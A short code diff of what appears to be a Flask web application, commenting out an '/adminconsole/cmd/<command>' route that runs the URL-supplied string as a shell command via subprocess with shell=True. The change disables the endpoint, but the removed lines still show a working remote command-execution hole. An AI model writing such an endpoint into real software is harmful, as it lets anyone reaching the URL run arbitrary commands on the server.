@@ -237,8 +237,8 @@ def uploadround(filename):
     else:
         return "Not authenticated."
 
-@app.route("/adminconsole/cmd/<command>")
-def cmd(command):
-    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
-    out = process.communicate()
-    return out
+# @app.route("/adminconsole/cmd/<command>")
+# def cmd(command):
+#     process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
+#     out = process.communicate()
+#     return out
